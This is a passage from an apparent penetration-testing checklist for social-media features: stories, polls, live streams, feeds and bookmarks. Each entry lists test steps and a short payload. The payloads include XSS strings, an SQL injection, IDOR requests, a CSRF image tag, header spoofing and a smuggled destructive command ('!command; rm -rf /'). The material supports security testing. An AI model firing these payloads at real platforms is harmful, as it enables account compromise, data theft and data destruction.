**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Add location to story 2. Spoof coordinates 3. Appear at fake location

**Expected Result:** Location should be validated

**Payload Example:**

```
Fake GPS coordinates in story
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / GPS Spoofing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-139 — Story Music Copyright Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Add copyrighted music 2. Bypass detection 3. Use restricted content

**Expected Result:** Music detection should be comprehensive

**Payload Example:**

```
Pitch-shifted or modified audio
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-140 — Story Download Bypass
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. View story 2. Capture media URL 3. Download despite restrictions

**Expected Result:** Download protection should be enforced

**Payload Example:**

```
Direct media URL access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-141 — Close Friends Story Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Find close friends story 2. Access without being in list 3. View restricted content

**Expected Result:** Close friends should be verified

**Payload Example:**

```
GET /api/stories/close_friends_only_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-142 — Poll Vote Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Vote in poll 2. Intercept request 3. Modify vote count 4. Inflate results

**Expected Result:** Vote counting should be server-side

**Payload Example:**

```
{"option_id":"1",vote_count:1000}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-143 — Poll Multiple Vote Exploit
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Vote in poll 2. Vote again 3. Bypass one-vote restriction

**Expected Result:** Single vote per user should be enforced

**Payload Example:**

```
Multiple POST /api/polls/123/vote
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## SOC-144 — Poll IDOR - View Private Poll
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Find private poll ID 2. Access results 3. View unauthorized poll

**Expected Result:** Private polls should verify access

**Payload Example:**

```
GET /api/polls/private_poll_id/results
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-145 — Poll Option Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Create poll with XSS option 2. Users view poll 3. XSS executes

**Expected Result:** Poll options should be sanitized

**Payload Example:**

```
option=<script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-146 — Poll Result Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. View poll results 2. Modify response 3. Display fake results

**Expected Result:** Results should be server-authoritative

**Payload Example:**

```
Client-side result manipulation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## SOC-147 — Poll Voter Anonymity Bypass
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Create anonymous poll 2. Access voter data 3. De-anonymize votes

**Expected Result:** Anonymous polls should protect voter identity

**Payload Example:**

```
GET /api/polls/anonymous_poll/voters
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-148 — Survey Response IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Submit survey response 2. Modify response_id 3. View others' responses

**Expected Result:** Responses should be private

**Payload Example:**

```
GET /api/surveys/123/responses/others_response
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-149 — Poll Duration Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Create poll with duration 2. Modify end time 3. Extend or shorten

**Expected Result:** Duration should be fixed after creation

**Payload Example:**

```
PUT /api/polls/123 {"ends_at":"2099-12-31"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-150 — Poll Vote Timing Attack
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Analyze vote submission timing 2. Correlate with user activity 3. Identify voters

**Expected Result:** Vote timing should not leak identity

**Payload Example:**

```
Timing analysis on vote endpoints
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-151 — Survey SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Submit survey with SQL payload 2. Check for errors 3. Extract data

**Expected Result:** Survey submissions should be parameterized

**Payload Example:**

```
answer='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-152 — Poll Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Polls / Surveys

**Test Steps:** 1. Vote rapidly from multiple sessions 2. Register multiple votes 3. Skew results

**Expected Result:** Vote submission should be atomic

**Payload Example:**

```
Parallel vote submissions
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SOC-153 — Stream Key Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Start live stream 2. Capture stream key 3. Reuse for unauthorized streaming

**Expected Result:** Stream keys should be protected

**Payload Example:**

```
Stream key in API response or URL
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-154 — Stream Hijacking
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Get victim's stream key 2. Start stream with stolen key 3. Impersonate streamer

**Expected Result:** Stream keys should be unpredictable and rotatable

**Payload Example:**

```
Use enumerated or stolen stream key
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / OBS

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-155 — Stream View Count Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. View stream 2. Inflate view count 3. Fake popularity

**Expected Result:** View counts should be accurate

**Payload Example:**

```
Multiple sessions or bot viewers
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SOC-156 — Stream Chat XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Send chat message with XSS 2. All viewers affected 3. Mass exploitation

**Expected Result:** Chat should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(1)> in chat
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-157 — Stream IDOR - Access Private Stream
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Find private stream ID 2. Access stream 3. View without authorization

**Expected Result:** Private streams should verify access

**Payload Example:**

```
GET /api/streams/private_stream_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-158 — Stream Recording Bypass
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Watch stream 2. Record despite restrictions 3. Capture private content

**Expected Result:** Recording protection limited by client

**Payload Example:**

```
External recording tools
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** OBS / Screen Recording

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-159 — Stream Ban Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Get banned from stream 2. Access via different method 3. View banned stream

**Expected Result:** Bans should be enforced consistently

**Payload Example:**

```
Access via API or different client
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-160 — Stream Donation Fraud
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Send donation 2. Chargeback after 3. Free exposure

**Expected Result:** Donation systems should handle chargebacks

**Payload Example:**

```
Send and reverse payment
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-161 — RTMP Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Analyze RTMP stream URL 2. Inject malicious parameters 3. Exploit streaming server

**Expected Result:** RTMP parameters should be validated

**Payload Example:**

```
Malicious RTMP URL parameters
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / OBS

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-162 — Stream Chat Command Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Find chat bot commands 2. Inject malicious commands 3. Exploit bot

**Expected Result:** Bot commands should be sanitized

**Payload Example:**

```
!command; rm -rf /
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Manual Testing

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## SOC-163 — Stream Metadata Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Modify stream metadata 2. Change category/tags 3. Appear in wrong categories

**Expected Result:** Metadata changes should be validated

**Payload Example:**

```
Stream adult content under kids category
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-164 — Stream CSRF - Force Go Live
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Create page triggering stream start 2. Victim visits 3. Victim's camera/mic activated

**Expected Result:** Stream start should require explicit consent

**Payload Example:**

```
CSRF to /api/streams/start
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-165 — Stream Quality Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Live Streaming

**Test Steps:** 1. Select quality setting 2. Modify to unauthorized quality 3. Get premium quality free

**Expected Result:** Quality tiers should be enforced

**Payload Example:**

```
{"quality":"4K"} for free tier
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-166 — Feed IDOR - Access Private Feed
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. View own feed 2. Modify user_id 3. View another user's private feed

**Expected Result:** Feed access should respect privacy

**Payload Example:**

```
GET /api/users/private_user/feed
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-167 — Feed Algorithm Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Analyze feed algorithm 2. Exploit ranking factors 3. Artificially boost content

**Expected Result:** Feed algorithm should resist manipulation

**Payload Example:**

```
Engagement farming techniques
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Analysis

**References:** CWE-840; PortSwigger Business logic

---

## SOC-168 — Feed Injection via Following
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Follow user with XSS in profile 2. Content appears in feed 3. XSS executes

**Expected Result:** All feed content should be sanitized

**Payload Example:**

```
Following user with XSS username
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-169 — Feed Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Request feed with injection 2. Poison cache 3. Serve malicious feed to others

**Expected Result:** Feed cache should be user-specific

**Payload Example:**

```
X-Forwarded-Host injection in feed request
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## SOC-170 — Hidden Content in Feed
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Find deleted/hidden content 2. Access via feed endpoint 3. View restricted content

**Expected Result:** Hidden content should not appear

**Payload Example:**

```
Deleted posts visible in cached feed
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-171 — Feed Pagination Exploitation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Paginate through feed 2. Use negative/large offsets 3. Access unintended content

**Expected Result:** Pagination should be bounded

**Payload Example:**

```
/feed?offset=-100 or offset=999999999
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-172 — Feed Rate Limiting Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Request feed rapidly 2. Bypass rate limits 3. Scrape all content

**Expected Result:** Feed requests should be rate-limited

**Payload Example:**

```
X-Forwarded-For rotation for feed
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SOC-173 — Chronological Feed Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. View chronological feed 2. Modify timestamps 3. Manipulate content order

**Expected Result:** Timestamps should be immutable

**Payload Example:**

```
Backdated content appearing as new
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-174 — Feed Preferences IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Set feed preferences 2. Modify user_id 3. Change others' preferences

**Expected Result:** Preferences should be user-specific

**Payload Example:**

```
PUT /api/users/victim/feed-preferences
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-175 — Suggested Content Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feed / Timeline

**Test Steps:** 1. Analyze suggestion algorithm 2. Game recommendations 3. Promote specific content

**Expected Result:** Suggestions should resist manipulation

**Payload Example:**

```
Coordinated engagement to boost content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Analysis

**References:** CWE-840; PortSwigger Business logic

---

## SOC-176 — Bookmark IDOR - Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. View own bookmarks 2. Modify user_id 3. View others' bookmarks

**Expected Result:** Bookmarks should be private

**Payload Example:**

```
GET /api/users/victim/bookmarks
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-177 — Bookmark IDOR - Add to Others'
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Bookmark post 2. Modify user_id 3. Add bookmark to victim's account

**Expected Result:** Bookmark should use session user

**Payload Example:**

```
POST /api/bookmarks {"user_id":"victim",post_id:"123"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-178 — Bookmark IDOR - Delete Others'
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Delete own bookmark 2. Modify bookmark_id 3. Delete others' bookmarks

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/bookmarks/victim_bookmark_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-179 — Bookmark Private Content
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Bookmark private post 2. Original deleted/privatized 3. Still access via bookmark

**Expected Result:** Bookmarks should respect current permissions

**Payload Example:**

```
Access deleted post via bookmark
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-180 — Bookmark Collection IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Create bookmark collection 2. Modify collection_id 3. Access others' collections

**Expected Result:** Collections should verify ownership

**Payload Example:**

```
GET /api/collections/victim_collection
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-181 — Bookmark Export Data Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Export bookmarks 2. Include private content 3. Share export

**Expected Result:** Exports should respect privacy

**Payload Example:**

```
Export containing private post data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-182 — CSRF on Bookmark
**Test Category:** Cross-Site Request Forgery · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Create page triggering bookmark 2. Victim visits 3. Post bookmarked

**Expected Result:** Bookmark should require CSRF token

**Payload Example:**

```
<img src="https://target.com/posts/123/bookmark">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SOC-183 — Bookmark XSS via Post Title
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Create post with XSS title 2. User bookmarks 3. XSS in bookmark list

**Expected Result:** Bookmark display should sanitize

**Payload Example:**

```
Bookmarked post with XSS title
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-184 — Bookmark Count Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bookmark / Save Posts

**Test Steps:** 1. Bookmark post 2. Check bookmark count 3. Inflate artificially

**Expected Result:** Bookmark counts should be accurate

**Payload Example:**

```
Multiple bookmarks from same user
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SOC-185 — Report IDOR - Report as Another User
